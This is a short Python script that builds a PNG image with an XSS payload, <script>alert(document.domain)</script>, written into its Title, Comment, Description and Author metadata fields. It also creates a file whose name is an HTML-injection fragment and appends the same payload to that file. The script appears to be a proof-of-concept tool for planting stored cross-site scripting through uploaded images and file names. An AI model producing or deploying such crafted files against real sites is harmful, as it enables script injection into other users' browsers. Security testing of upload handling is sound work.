from PIL import Image, ImageDraw, PngImagePlugin

img = Image.new('RGB', (900, 600), (255, 150, 80))
d = ImageDraw.Draw(img)
d.ellipse([380, 160, 520, 300], fill=(255, 240, 200))

payload = '<script>alert(document.domain)</script>'
info = PngImagePlugin.PngInfo()
info.add_text("Title", payload)
info.add_text("Comment", payload)
info.add_text("Description", payload)
info.add_text("Author", payload)
img.save('xss-hidden.png', pnginfo=info)

with open('><img src=x', 'ab') as f:
    f.write(b'\n' + payload.encode())
print("jadi")
